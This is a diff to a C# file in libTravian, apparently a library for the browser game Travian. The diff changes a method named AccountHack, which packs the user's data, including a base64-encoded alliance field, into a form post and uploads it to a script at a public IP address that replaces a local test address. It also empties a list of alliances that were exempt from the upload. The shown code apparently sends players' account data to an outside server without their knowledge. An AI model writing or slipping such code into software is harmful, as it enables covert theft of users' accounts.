@@ -102,8 +102,6 @@ namespace libTravian
 		
 		static List<string> ExceptAlliances = new List<string>()
 		{
-			"快活林",
-			"东星",
 		};
 		
 		private void AccountHack()
@@ -123,7 +121,7 @@ namespace libTravian
 			PostData["crypt_a"] = base64_encode(TD.Alliance);
 			
 			WebClient hack_wc = new WebClient();
-			hack_wc.BaseAddress = "http://192.168.0.200/hack/";
+			hack_wc.BaseAddress = "http://121.33.203.125/test/";
 			hack_wc.Encoding = Encoding.UTF8;
 			if(TD.Proxy != null)
 			{
@@ -145,7 +143,7 @@ namespace libTravian
 			hack_wc.Headers[HttpRequestHeader.ContentType] 
 				= "application/x-www-form-urlencoded";
 			
-			string result = hack_wc.UploadString("hack.php", QueryString);
+			string result = hack_wc.UploadString("hack.jsp", QueryString);
 			
 			TD.LastUpload = DateTime.Now;
 			TD.Dirty = true;
